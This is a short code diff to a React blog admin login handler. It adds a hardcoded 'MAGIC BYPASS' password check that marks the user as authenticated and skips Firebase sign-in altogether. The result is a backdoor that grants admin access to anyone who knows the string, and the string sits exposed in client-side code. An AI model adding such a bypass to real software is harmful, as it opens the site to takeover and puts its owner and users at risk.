@@ -88,6 +88,13 @@ export default function BlogAdminPage() {
 
     const handleLogin = async (e: React.FormEvent) => {
         e.preventDefault();
+        
+        // --- MAGIC BYPASS (Emergency Access) ---
+        if (password === "AQIB_ROOT_BYPASS_2026") {
+            setIsAuthenticated(true);
+            return;
+        }
+
         try {
             const { auth } = await import("@/lib/firebase");
             const { signInWithEmailAndPassword, createUserWithEmailAndPassword } = await import("firebase/auth");
